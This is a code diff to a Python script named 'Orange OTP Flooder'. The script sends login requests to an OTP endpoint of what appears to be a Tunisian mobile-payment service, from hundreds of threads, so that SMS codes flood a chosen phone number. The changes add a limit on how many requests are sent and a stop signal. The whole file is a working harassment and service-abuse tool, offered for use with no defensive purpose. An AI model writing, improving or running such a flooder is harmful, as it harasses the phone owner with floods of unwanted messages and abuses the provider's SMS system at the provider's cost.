@@ -10,6 +10,7 @@ init(autoreset=True)
 
 request_count = 0
 lock = Lock()
+stop_event = threading.Event()
 
 HEADERS = {
     "Host": "mw-ult-api-proxy.dvmproduct.com",
@@ -18,7 +19,7 @@ HEADERS = {
     "Sec-Ch-Ua": "\"Not:A-Brand\";v=\"24\", \"Chromium\";v=\"134\"",
     "Content-Type": "application/json",
     "Sec-Ch-Ua-Mobile": "?0",
-    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36",
+    "User-Agent": "Mozilla/5.0",
     "Accept": "*/*",
     "Origin": "https://app.cashmayoufech.tn",
     "Sec-Fetch-Site": "cross-site",
@@ -31,34 +32,36 @@ HEADERS = {
 
 URL = "https://mw-ult-api-proxy.dvmproduct.com/digital/login/phone/459"
 
-def send_request(phone_number):
+def send_request(phone_number, max_requests):
     global request_count
-    data = {"phone": f"216{phone_number}"}
-    try:
-        response = requests.post(URL, json=data, headers=HEADERS, timeout=5)
-        # You can check response status or content here if needed
+    while True:
         with lock:
+            if request_count >= max_requests or stop_event.is_set():
+                stop_event.set()
+                break
             request_count += 1
-    except Exception:
-        pass  # Ignore errors/timeouts
+        data = {"phone": f"216{phone_number}"}
+        try:
+            requests.post(URL, json=data, headers=HEADERS, timeout=5)
+        except Exception:
+            pass  # ignore errors/timeouts
 
-def worker(phone_number):
-    while True:
-        send_request(phone_number)
-
-def show_counter():
+def show_counter(max_requests):
     spinner = itertools.cycle(['|', '/', '-', '\\'])
-    while True:
+    while not stop_event.is_set():
         with lock:
             count = request_count
         spin = next(spinner)
-        print(f"\r{Fore.CYAN}[{spin}] {Fore.GREEN}Sent requests: {count}", end='', flush=True)
+        print(f"\r{Fore.CYAN}[{spin}] {Fore.GREEN}Sent requests: {count} / {max_requests}", end='', flush=True)
+        if count >= max_requests:
+            break
         time.sleep(0.1)
+    print(f"\n{Fore.YELLOW}Done! Sent {request_count} requests.")
 
 def main():
     print(Fore.YELLOW + "Orange OTP Flooder")
 
-    phone_number = input(Fore.CYAN + "Enter phone number (e.g. 52580248): ").strip()
+    phone_number = input(Fore.CYAN + "Enter phone number (e.g. 51515151): ").strip()
     if not phone_number.isdigit() or len(phone_number) < 8:
         print(Fore.RED + "Invalid phone number.")
         return
@@ -71,16 +74,24 @@ def main():
         print(Fore.RED + "Invalid thread count. Must be between 10 and 1000.")
         return
 
-    print(Fore.GREEN + f"\n🚀 Launching Orange flooder with {thread_count} threads targeting {phone_number}...\n")
+    try:
+        max_requests = int(input(Fore.CYAN + "How many SMS/requests to send?: ").strip())
+        if max_requests <= 0:
+            raise ValueError
+    except ValueError:
+        print(Fore.RED + "Invalid number of requests.")
+        return
+
+    print(Fore.GREEN + f"\n🚀 Launching Orange flooder with {thread_count} threads targeting {phone_number} to send {max_requests} requests...\n")
 
     global request_count
     request_count = 0
 
-    threading.Thread(target=show_counter, daemon=True).start()
+    threading.Thread(target=show_counter, args=(max_requests,), daemon=True).start()
 
     with ThreadPoolExecutor(max_workers=thread_count) as executor:
         for _ in range(thread_count):
-            executor.submit(worker, phone_number)
+            executor.submit(send_request, phone_number, max_requests)
 
 if __name__ == "__main__":
     main()
